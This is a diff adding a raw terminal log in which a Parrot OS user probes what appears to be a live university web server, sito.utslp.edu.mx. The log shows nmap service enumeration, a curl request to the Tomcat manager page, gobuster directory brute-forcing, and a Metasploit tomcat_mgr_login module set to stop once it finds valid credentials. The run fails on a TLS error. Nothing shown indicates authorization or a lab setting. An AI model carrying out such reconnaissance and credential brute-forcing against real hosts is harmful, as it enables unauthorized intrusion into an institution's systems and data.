@@ -1,0 +1,169 @@
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "password\|user\|login\|database\|jdbc\|connection" *.jsp
+index2.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index2.jsp:						<input type="password" name="xContrasena" id="xContrasena" class="pass"
+index2.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index.jsp:						<input type="password" name="xContrasena" id="xContrasena" class="pass"
+index.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "select\|insert\|update\|delete" *.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "select\|insert\|update\|delete" *.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $
+
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $nmap --script "http-methods" -p 443 sito.utslp.edu.mx
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-02 08:49 CST
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 8.22 seconds
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $nmap --script "http-enum" -p 443 sito.utslp.edu.mx
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-02 08:49 CST
+Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Nmap scan report for sito.utslp.edu.mx (189.254.143.102)
+Host is up (0.024s latency).
+rDNS record for 189.254.143.102: utslp.edu.mx
+
+PORT    STATE SERVICE
+443/tcp open  https
+| http-enum: 
+|   /examples/: Sample scripts
+|   /javascript/sorttable.js: Secunia NSI
+|   /manager/html/upload: Apache Tomcat (401 No Autorizado)
+|_  /manager/html: Apache Tomcat (401 No Autorizado)
+
+─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $curl -k "https://sito.utslp.edu.mx/manager/status"
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+ <head>
+  <title>401 Unauthorized</title>
+  <style type="text/css">
+    <!--
+    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
+    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
+    PRE, TT {border: 1px dotted #525D76}
+    A {color : black;}A.name {color : black;}
+    -->
+  </style>
+ </head>
+ <body>
+   <h1>401 Unauthorized</h1>
+   <p>
+    You are not authorized to view this page. If you have not changed
+    any configuration files, please examine the file
+    <tt>conf/tomcat-users.xml</tt> in your installation. That
+    file must contain the credentials to let you use this webapp.
+   </p>
+   <p>
+    For example, to add the <tt>manager-gui</tt> role to a user named
+    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
+    config file listed above.
+   </p>
+<pre>
+&lt;role rolename="manager-gui"/&gt;
+&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
+</pre>
+   <p>
+    Note that for Tomcat 6.0.30 onwards, the roles required to use the manager
+    application were changed from the single <tt>manager</tt> role to the
+    following four roles. You will need to assign the role(s) required for
+    the functionality you wish to access.
+   </p>
+    <ul>
+      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
+          pages</li>
+      <li><tt>manager-script</tt> - allows access to the text interface and the
+          status pages</li>
+      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
+          pages</li>
+      <li><tt>manager-status</tt> - allows access to the status pages only</li>
+    </ul>
+   <p>
+    The HTML interface is protected against CSRF but the text and JMX interfaces
+    are not. To maintain the CSRF protection:
+   </p>
+   <ul>
+    <li>The deprecated <tt>manager</tt> role should not be assigned to any
+        user.</li>
+    <li>Users with the <tt>manager-gui</tt> role should not be granted either
+        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
+    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
+        testing since these interfaces are intended for tools not humans) then
+        the browser must be closed afterwards to terminate the session.</li>
+   </ul>
+   <p>
+    For more information - please see the
+    <a href="/docs/manager-howto.html">Manager App HOW-TO</a>.
+   </p>
+ </body>
+
+TARGETURI => /manager/html
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SToP_ON_SUCCESS t
+rue
+SToP_ON_SUCCESS => true
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
+[*] Error: 189.254.143.102: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=189.254.143.102:443 state=error: tlsv1 alert protocol version
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[msf](Jobs:0 
+Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> 
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "password\|user\|login\|database\|jdbc\|connection" *.jsp
+index2.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index2.jsp:						<input type="password" name="xContrasena" id="xContrasena" class="pass"
+index2.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+index.jsp:						<input type="password" name="xContrasena" id="xContrasena" class="pass"
+index.jsp:							onkeypress="return Password(event)" onfocus="SITO_Alerta('hidden', '#008000')" 
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "select\|insert\|update\|delete" *.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $grep -i "select\|insert\|update\|delete" *.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS]
+└──╼ $
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/css/]
+/docs                 (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/docs/]
+/examples             (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/examples/]
+/fotos                (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/fotos/]
+/hello.jsp            (Status: 200) [Size: 891]
+/host-manager         (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/host-manager/]
+/images               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/images/]
+/index.html           (Status: 200) [Size: 634]
+/index.jsp            (Status: 200) [Size: 15938]
+/index.html           (Status: 200) [Size: 634]
+/index2.jsp           (Status: 200) [Size: 14224]
+/javascript           (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/javascript/]
+/jsp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/jsp/]
+/manager              (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/manager/]
+Progress: 10074 / 18460 (54.57%)^Z
+[1]+  Detenido                gobuster dir -u https://sito.utslp.edu.mx/ -w /usr/share/wordlists/dirb/common.txt -x jsp,html,xml --timeout 45s --delay 1000ms --threads 5
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS/JSS]
+└──╼ $fg
+gobuster dir -u https://sito.utslp.edu.mx/ -w /usr/share/wordlists/dirb/common.txt -x jsp,html,xml --timeout 45s --delay 1000ms --threads 5
+Progress: 10075 / 18460 (54.58%)[ERROR] Get "https://sito.utslp.edu.mx/microsoft.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "https://sito.utslp.edu.mx/midi.jsp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "https://sito.utslp.edu.mx/midi": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] Get "https://sito.utslp.edu.mx/microsoft.xml": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+/styles               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/styles/]
+/Thumbs.db            (Status: 200) [Size: 154624]
+/tmp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/tmp/]
+Progress: 18456 / 18460 (99.98%)
+===============================================================
+Finished
+===============================================================
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/HTMLS/JSS]
+└──╼ $
+
